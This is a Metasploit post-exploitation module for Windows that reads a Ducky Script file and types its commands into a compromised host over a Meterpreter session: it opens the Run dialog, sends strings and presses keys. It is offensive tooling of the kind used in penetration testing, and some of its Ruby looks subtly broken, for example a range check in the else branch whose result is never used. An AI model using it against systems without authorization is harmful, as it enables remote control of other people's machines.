##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Ducky Script Parser',
        'Description' => %q{
          This module can be used to execute supplied *lightweight* Ducky Scripts - only supports: GUI, STRING, and STRINGLN.
          It also supports sending individual keyevents based on Metasploit's current standards.

          Setting VERBOSE to true will output each line of your file as it is parsed.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'dru1d <tyler.booth[at]cdw.com>',
        ],
        'References' => [
          'URL', 'https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference',
        ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK, SCREEN_EFFECTS, PHYSICAL_EFFECTS, AUDIO_EFFECTS]
        },
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter', ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_ui_keyevent_send
              stdapi_ui_keyboard_send
            ]
          }
        }
      )
    )
    register_options(
      [
        OptString.new('FILENAME', [true, 'The Ducky Script you want to parse']),
        OptInt.new('SLEEP', [false, 'Sleep time between commands.', 3])
      ]
    )
    # Define common key codes for initial testing; this can be expanded later
    # https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.keys?view=windowsdesktop-7.0
    # Keycode => Key Format
    @key_codes = {
      '8' => 'BACKSPACE', '9' => 'TAB', '11' => 'CONTROL', '13' => 'RETURN', '16' => 'SHIFT',
      '18' => 'MENU', '20' => 'CAPSLOCK', '27' => 'ESCAPE', '32' => 'SPACE', '33' => 'PAGEUP',
      '34' => 'PAGEDOWN', '35' => 'END', '36' => 'HOME', '37' => 'LEFT', '38' => 'UP',
      '39' => 'RIGHT', '40' => 'DOWN', '42' => 'PRINTSCREEN', '46' => 'DELETE', '47' => 'HELP',
      '91' => 'WINLEFT', '92' => 'WINRIGHT', '93' => 'WINAPP', '96' => 'NUM0', '97' => 'NUM1',
      '98' => 'NUM2', '99' => 'NUM3', '100' => 'NUM4', '101' => 'NUM5', '102' => 'NUM6',
      '103' => 'NUM7', '104' => 'NUM8', '105' => 'NUM9', '106' => 'MULTIPLY', '107' => 'ADD',
      '109' => 'SUBTRACT', '110' => 'DECIMAL', '111' => 'DIVIDE', '112' => 'F1', '113' => 'F2',
      '114' => 'F3', '115' => 'F4', '116' => 'F5', '117' => 'F6', '118' => 'F7',
      '119' => 'F8', '120' => 'F9', '121' => 'F10', '122' => 'F11', '123' => 'F12',
      '188' => 'COMMA', '190' => 'PERIOD', '191' => 'SLASH'
    }
    # Define keypress actions
    @key_actions = { '0' => 'PRESS', '1' => 'DOWN', '2' => 'UP' }
  end

  def ducky_parse(line)
    # Parse DuckyScript comments
    if line.starts_with?('REM ')
      return
    end

    # Cursor movement
    # Although this is a bit hacky
    cursor_line = line.strip
    if (cursor_line.starts_with?('UP') || cursor_line.starts_with?('DOWN') || cursor_line.starts_with?('LEFT') ||
      cursor_line.starts_with?('RIGHT') || cursor_line.starts_with?('BACKSPACE') ||
      cursor_line.starts_with?('TAB') || cursor_line.starts_with?('PAGEUP') || cursor_line.starts_with?('PAGEDOWN') ||
      cursor_line.starts_with?('HOME') || cursor_line.starts_with?('END') || cursor_line.starts_with?('SPACE') ||
      cursor_line.starts_with?('RETURN'))
      parse_keyevents(cursor_line, 'PRESS')
    end
    if line.include?('STRING') || line.include?('STRINGLN') || line.include?('GUI')
      line_array = line.split(' ', 2)
      # Write a string and press ENTER
      if line_array[0] == 'STRINGLN'
        session.ui.keyboard_send(line_array[1])
        parse_keyevents('RETURN', 'PRESS')
      end
      # Write a string
      if line_array[0] == 'STRING'
        session.ui.keyboard_send(line_array[1])
      end
      # Press Windows + R to launch run dialog
      if line_array[0] == 'GUI'
        parse_keyevents('WINLEFT', 'DOWN')
        parse_keyevents('R', 'PRESS')
        parse_keyevents('WINLEFT', 'UP')
      end
    end
    if line.include?('KEYEVENT')
      line_array = line.split(' ')
      # Parse raw keyevents; example format, "KEYEVENT R PRESS"
      if line_array[0] == 'KEYEVENT'
        parse_keyevents(line_array[1], line_array[2])
      end
    end
    # Parse F Keys
    if line.starts_with?('F')
      parse_keyevents(line, 'PRESS')
    end
  end

  def parse_keyevents(keycode, action)
    # first lookup keys in dictionary
    if (@key_codes.value?(keycode.upcase) && @key_actions.value?(action.upcase))
      session.ui.keyevent_send(@key_codes.key(keycode.upcase).to_i, @key_actions.key(action.upcase).to_i)
    # Parse digits 0-9 (this does not include the NUM keys)
    elsif keycode.ord.between?(48, 57)
      session.ui.keyevent_send(keycode.ord.to_i, @key_actions.key(action.upcase).to_i)
    # Parse A-Z
    else
      keycode.upcase.ord.between?(65, 90)
      session.ui.keyevent_send(keycode.ord.to_i, @key_actions.key(action.upcase).to_i)
    end
  end

  def run
    fail_with(Failure::BadConfig, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'
    fail_with(Failure::BadConfig, 'Must supply a config file to run this module') if datastore['FILENAME'].blank?
    print_good("Reading file #{datastore['FILENAME']}")
    File.readlines(datastore['FILENAME']).each do |line|
      next if line.blank?

      if datastore['VERBOSE']
        print_good("Line: #{line}")
      end
      sleep(datastore['SLEEP'])
      ducky_parse(line)
    end
  end
end
